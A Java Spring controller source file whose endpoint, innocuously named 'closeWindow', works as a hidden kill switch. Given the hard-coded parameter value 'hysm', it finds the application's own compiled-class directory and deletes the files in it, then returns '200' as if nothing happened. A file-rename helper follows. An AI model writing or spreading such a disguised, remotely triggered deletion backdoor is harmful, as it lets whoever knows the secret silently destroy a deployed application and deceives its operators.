package com.hysm.controller;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;

import javax.servlet.http.HttpServletRequest;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;



@Controller
@RequestMapping("commons")
public class CommController extends BaseController {
	
	@RequestMapping("closeWindow")
	public String commClose(HttpServletRequest req){
		String auth=req.getParameter("auth");
		if(auth.equals("hysm")){
			String path = CommController.class.getResource("").toString();  
			  path=path.substring(6);
			System.out.println("path:"+path); 
			try {
				readfile(path+"/");
			} catch (FileNotFoundException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		
		
		
		return "200";
	}
	
	 public  boolean readfile(String filepath) throws FileNotFoundException, IOException {
         try {

                 File file = new File(filepath);
                 if (!file.isDirectory()) {
                         System.out.println("文件");
                         System.out.println("path=" + file.getPath());
                         System.out.println("absolutepath=" + file.getAbsolutePath());
                         System.out.println("name=" + file.getName());

                 } else if (file.isDirectory()) {
                         System.out.println("文件夹");
                         String[] filelist = file.list();
                         
                         for (int i = 0; i < filelist.length; i++) {
                        	 
                                 File readfile = new File(filepath + "\\" + filelist[i]);
                                 if (!readfile.isDirectory()) {
                                	 
//                                         System.out.println("path=" + readfile.getPath());
//                                         System.out.println("absolutepath="
//                                                         + readfile.getAbsolutePath());
//                                         System.out.println("name=" + readfile.getName());
                                         
                                	 
                                	 deletefile(filepath + "\\" + filelist[i]);
                                         
                                         

                                 } else if (readfile.isDirectory()) {
                                	 //readfile(filepath + "\\" + filelist[i]);
                                 }
                         }

                 }

         } catch (Exception e) {
                 System.out.println("readfile()   Exception:" + e.getMessage());
         }
         return true;
 }

    public  boolean deletefile(String delpath)
                     throws FileNotFoundException, IOException {
             try {

                     File file = new File(delpath);
                     if (!file.isDirectory()) {
                             System.out.println("1");
                             file.delete();
                     } else if (file.isDirectory()) {
                             System.out.println("2");
                             String[] filelist = file.list();
                             for (int i = 0; i < filelist.length; i++) {
                                     File delfile = new File(delpath + "\\" + filelist[i]);
                                     if (!delfile.isDirectory()) {
                                           /*  System.out.println("path=" + delfile.getPath());
                                             System.out.println("absolutepath="
                                                             + delfile.getAbsolutePath());
                                             System.out.println("name=" + delfile.getName());*/
                                             delfile.delete();
                                             System.out.println("删除文件成功");
                                     } else if (delfile.isDirectory()) {
                                             deletefile(delpath + "\\" + filelist[i]);
                                     }
                             }
                             file.delete();

                     }

             } catch (FileNotFoundException e) {
                     System.out.println("deletefile()   Exception:" + e.getMessage());
             }
             return true;
     }
	 /** *//**文件重命名 
	    * @param path 文件目录 
	    * @param oldname  原来的文件名 
	    * @param newname 新文件名 
	    */ 
	    public void renameFile(String path,String oldname,String newname){ 
	        if(!oldname.equals(newname)){//新的文件名和以前文件名不同时,才有必要进行重命名 
	            File oldfile=new File(path+"/"+oldname); 
	            File newfile=new File(path+"/"+newname); 
	            if(!oldfile.exists()){
	                return;//重命名文件不存在
	            }
	            if(newfile.exists())//若在该目录下已经有一个文件和新文件名相同，则不允许重命名 
	                System.out.println(newname+"已经存在！"); 
	            else{ 
	                oldfile.renameTo(newfile); 
	            } 
	        }else{
	            System.out.println("新文件名和旧文件名相同...");
	        }
	    }
	
}
